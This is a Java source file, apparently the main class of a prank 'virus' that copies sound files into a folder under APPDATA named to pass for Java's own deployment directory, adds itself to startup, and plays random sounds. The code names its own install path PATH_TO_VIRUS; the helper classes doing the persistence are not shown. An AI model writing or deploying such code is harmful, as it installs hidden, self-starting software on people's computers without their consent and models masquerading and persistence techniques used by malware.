package com.TeaFaris;

import java.io.File;

public class Start {
    public static final String SOUNDS_PATH = "resources/sounds/";
    public static final String CONFIG_NAME = "config.properties";
    public static final String CONFIG_PATH = "resources/config.properties";
    public static final String PATH_TO_VIRUS = FileHandling.getPathOut(new String[]{"Sun", "Java", "Deployment"}, System.getenv("APPDATA"));

    public static void main(String[] args) throws Exception {
        // Classes.
        FileHandling fileHandling = new FileHandling();
        ConfigurationWork cfgWork = new ConfigurationWork();
        Actions actions = new Actions();
        // Set sound names
        String[] soundNames = fileHandling.setAndGetSoundNames();
        // Creates and/or checking config and log file.
        File config = cfgWork.createConfig(CONFIG_PATH);
        String[] folders = cfgWork.getConfigPropertyArray(config, "addSpecialFolders");
        cfgWork.createLog(folders, soundNames);
        // Using folders, finds out the path and creates the folders.
        String pathOut = FileHandling.getPathOut(folders, PATH_TO_VIRUS);
        // Extracting sounds into hard drive.
        fileHandling.extractSounds(soundNames, pathOut);
        // Sets startup
        actions.setStartup(cfgWork.getConfigBoolean(config, "addToStartup"));
        // Starts streaming sounds.
        actions.streamRandomSound(config, pathOut, soundNames, true);
    }
}